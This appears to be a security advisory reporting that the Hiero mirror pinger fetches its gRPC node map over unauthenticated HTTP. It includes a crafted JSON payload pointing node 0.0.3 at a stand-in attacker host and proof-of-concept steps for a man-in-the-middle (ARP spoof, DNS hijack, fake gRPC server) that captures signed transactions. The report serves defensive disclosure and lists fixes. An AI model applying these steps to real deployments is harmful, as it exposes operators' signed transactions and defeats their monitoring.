### Title
Unauthenticated HTTP Fetch of gRPC Network Topology Enables MITM Node Substitution in Pinger

### Summary
When `HIERO_MIRROR_PINGER_NETWORK=other`, the pinger fetches its entire gRPC node map over a plain HTTP connection to `HIERO_MIRROR_PINGER_REST` with no TLS, no response signature verification, and no allowlist validation of returned addresses. A network-positioned attacker who intercepts this HTTP response can inject a crafted `nodesEnvelope` that maps all node account IDs to attacker-controlled gRPC endpoints, causing every subsequent `cryptoTransfer.Execute(client)` to deliver signed transaction bytes to the attacker's server instead of the real Hedera network.

### Finding Description

**Code path:**

`pinger/sdk_client.go` lines 17–22: when `cfg.network == "other"`, `buildNetworkFromMirrorNodes` is called and its return value is passed directly to `hiero.ClientForNetwork(netmap)` with no further validation. [1](#0-0) 

`pinger/mirror_node_client.go` lines 74–131: `fetchMirrorNodeNetwork` issues a plain `http.Client` GET to the configured URL, JSON-decodes the body into `nodesEnvelope`, and builds the network map entirely from the attacker-supplied `service_endpoints` fields. The only guard is `len(network) == 0` (line 127); there is no TLS enforcement, no HMAC/signature check, no IP allowlist, and no comparison against a known-good topology. [2](#0-1) 

`pinger/config.go` line 37: the default example URL is `http://mirror-rest:5551` — plain HTTP — and no code ever enforces HTTPS. [3](#0-2) 

**Root cause:** The network topology bootstrap is treated as trusted data despite being fetched over an unauthenticated, unencrypted channel. The `nodesEnvelope` struct accepts arbitrary `ip_address_v4`/`domain_name` and `port` values with no constraints. [4](#0-3) 

**Exploit flow:**

1. Attacker intercepts the HTTP GET to `<mirrorRest>/api/v1/network/nodes`.
2. Attacker returns a crafted JSON body, e.g.:
   ```json
   {"nodes":[{"node_account_id":"0.0.3","service_endpoints":[{"ip_address_v4":"attacker.example.com","port":50211}]}]}
   ```
3. `fetchMirrorNodeNetwork` builds `network["attacker.example.com:50211"] = AccountID{0,0,3}` and returns it.
4. `hiero.ClientForNetwork(netmap)` creates a client whose sole gRPC target is the attacker's server.
5. Every `cryptoTransfer.Execute(client)` in `submitWithRetry` sends the fully-signed transaction bytes to the attacker's gRPC endpoint. [5](#0-4) 

### Impact Explanation

The attacker's gRPC server receives every signed `CryptoTransfer` transaction. Concrete consequences:

- **Transaction interception / replay suppression**: The attacker can silently drop all transactions, causing the pinger to report failures while the real network sees nothing.
- **Fake receipt injection**: The attacker can return a synthetic `SUCCESS` receipt, masking the fact that no real transfer occurred — defeating the pinger's liveness-monitoring purpose entirely.
- **Signed transaction exfiltration**: The attacker obtains valid, time-bounded signed transaction bytes. While the transaction body itself is immutable (sender, recipient, amount are fixed by the signature), the attacker can forward them selectively or at a chosen time within the validity window, giving them control over when (or whether) the transfer settles on-chain.

Direct theft of HBAR is not possible because the transaction body is already signed with fixed transfer parties and amounts. However, the integrity of the pinger's monitoring function is completely destroyed, and the operator's signed transactions are exposed to an untrusted third party.

### Likelihood Explanation

The attack requires network-path positioning between the pinger pod and the mirror REST service. This is realistic in:

- Shared Kubernetes clusters where a compromised sidecar or CNI plugin can intercept pod-to-pod HTTP traffic.
- Cloud environments where an attacker controls a load balancer, proxy, or DNS record for the mirror service hostname.
- DNS poisoning of the `mirror-rest` hostname (the default example uses a bare hostname, not an IP).

No credentials or privileges on the pinger host itself are required. The attack is repeatable on every pinger restart (the network map is fetched once at startup) and is silent — the pinger logs no TLS or certificate errors because none are expected.

### Recommendation

1. **Enforce HTTPS**: Reject any `HIERO_MIRROR_PINGER_REST` URL that does not use the `https` scheme at config-load time (`pinger/config.go`).
2. **Pin the CA or certificate**: Configure the `http.Client` with a custom `tls.Config` that pins the expected CA or leaf certificate for the mirror REST endpoint.
3. **Validate returned addresses**: After decoding `nodesEnvelope`, cross-check returned IP addresses and domain names against a configurable allowlist or CIDR range; reject private/loopback addresses unless explicitly permitted.
4. **Periodic re-fetch with staleness guard**: If the network map is ever refreshed at runtime, apply the same validation and require a quorum of previously-known addresses to still be present before accepting the new map.

### Proof of Concept

```
# 1. Start a fake gRPC server on attacker machine (port 50211) that logs
#    incoming bytes and returns a fake TransactionResponse{nodeTransactionPrecheckCode: OK}
#    and a fake TransactionGetReceiptResponse{status: SUCCESS}.

# 2. Position yourself as MITM (e.g. ARP spoof, DNS hijack, or rogue proxy)
#    on the path between the pinger pod and the mirror REST service.

# 3. Intercept GET /api/v1/network/nodes and respond with:
curl -s http://<pinger-mirror-rest>/api/v1/network/nodes
# → replace response body with:
# {"nodes":[{"node_account_id":"0.0.3","service_endpoints":[{"ip_address_v4":"<attacker-ip>","port":50211}]}]}

# 4. Restart (or wait for) the pinger. It calls newClient() → buildNetworkFromMirrorNodes()
#    → fetchMirrorNodeNetwork() → receives the crafted JSON → builds client pointing to <attacker-ip>:50211.

# 5. On the next ticker tick, submitWithRetry() calls cryptoTransfer.Execute(client).
#    The Hiero SDK serialises and signs the CryptoTransfer, then opens a gRPC stream
#    to <attacker-ip>:50211 and sends the signed transaction bytes.

# 6. Attacker's server logs the full signed transaction protobuf.
#    Pinger receives the fake SUCCESS receipt and logs "transfer success".
#    No transfer ever reaches the real Hedera network.
```
